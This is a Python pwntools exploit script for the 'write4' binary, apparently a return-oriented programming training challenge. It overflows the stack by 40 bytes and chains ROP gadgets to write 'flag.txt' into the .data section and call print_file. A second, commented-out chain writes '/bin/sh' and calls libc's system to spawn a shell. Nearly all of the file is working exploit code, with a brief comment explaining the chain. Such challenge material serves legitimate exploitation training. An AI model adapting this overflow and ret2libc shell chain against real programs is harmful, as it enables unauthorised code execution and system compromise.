#!/bin/python3
from pwn import *
import sys

binary = "./write4"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
libc.address = 0x00007ffff7a1f000
rop = ROP(elf)

#### GDB Script
script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    ### MAIN CODE HERE
    io = start()
    io.recvuntil('> ')
    
    pop_r14_r15 = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
    usefulgadget = 0x0000000000400628 # mov [r14], r15
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    addr = 0x601028 # memory address in .data
    offset = 40
    payload = flat(
        cyclic(offset),
        pop_r14_r15,
        addr,
        "flag.txt",
        usefulgadget,

        pop_rdi,
        addr,
        0x00400510 #print_file addr 
    )
    '''
    payload explained
    first overflow to rip

    pop r14 and 15
    fill them
    r14 = addr # address to place string in r15
    r15 = "flag.txt" 

    call mov r14, r15

    pop rdi
    addr # address where string recides
    function address
    '''

    ### GET shell
    exploit = flat(
        cyclic(offset),
        pop_r14_r15,
        addr,
        "/bin/sh",
        usefulgadget,
        pop_rdi,
        addr,
        libc.symbols['system']
    )

    io.sendline(payload)
    #io.sendline(exploit)
    io.interactive()


if __name__ == "__main__":
    main()